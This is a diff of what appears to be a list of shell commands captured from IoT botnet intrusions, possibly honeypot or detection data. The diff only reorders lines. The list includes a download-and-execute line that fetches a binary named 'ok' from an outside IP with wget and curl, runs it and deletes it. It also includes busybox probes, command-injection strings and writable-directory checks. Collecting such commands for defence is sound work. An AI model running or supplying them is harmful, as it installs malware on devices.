@@ -37,8 +37,8 @@ echo xsec
 &k`g&k|zpkfq)ES[M
 g & k | zpkfq
 /bin/./uname -s -v -n -r -m
-uname -a
 exit
+uname -a
 (cd /tmp; wget http://5.182.210.174/ok; curl -O http://5.182.210.174/ok; chmod +x ok; sh ok; rm -rf ok; rm -rf ok.1) >/dev/null 2>&1 &
 ./ok
 /userfs/bin/wget http://5.182.210.174/ok
@@ -49,9 +49,9 @@ cd /dev
 cd /var/tmp
 chmod +x ok
 chmod 777 ok
-ping; sh
 rm -rf ok
 rm -rf ok.1
+ping; sh
 /bin/busybox cat /proc/self/exe || cat /proc/self/exe
 za
 zalee
@@ -74,9 +74,9 @@ ps | grep '[Mm]iner'
 rm ./upnpsetup
 sudo ./upnpsetup
 uname -m&&pkill upnpsetup
+/bin/busybox TEST
 >/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x44\x43\x41\x47\x52\x4a'
 PING
-/bin/busybox TEST
 >/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x5a\x4b\x53\x44\x48\x51'
 sudo pkill upnpsetup
 >/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x42\x48\x4c\x4d\x51\x48'
